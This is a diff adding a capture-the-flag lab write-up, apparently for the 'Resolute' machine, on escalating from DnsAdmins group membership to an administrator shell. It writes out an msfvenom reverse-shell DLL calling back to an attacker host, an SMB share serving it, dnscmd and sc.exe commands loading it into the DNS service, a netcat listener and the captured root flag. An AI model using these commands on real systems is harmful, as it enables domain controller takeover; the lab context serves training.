@@ -201,5 +201,42 @@ Email to team:
 - due to change freeze, any system changes (apart from those to the administrator account) will be automaticallithin 1 minute
 ```
 - 
+ running whoami /groups found out that ryan is a member of dnsadmin so i searched for exploit for this group and found ablog
+```
+https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83#
+```
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 -f dll -o rev.dll
+```
+-then open smbserver
+```
+$ impacket-smbserver share .                                                                                             
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+- now we need to execute every thing in under aminute because of the note
+-Set the server level plugin to be rev.dll on my share
+-Stop the DNS server.
+-Start the DNS server
+- so we start the commands like this
+```
+nc -lvnp 443
+dnscmd.exe /config /serverlevelplugindll \\10.10.14.15\share\rev.dll
+sc.exe \\resolute stop dns
+sc.exe \\resolute start dns
+```
+- and we got a shell as admin and we got the root flag
+```
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+6117978641e34cd79280b3c7f19a6943
+
+C:\Users\Administrator\Desktop>
+```
 
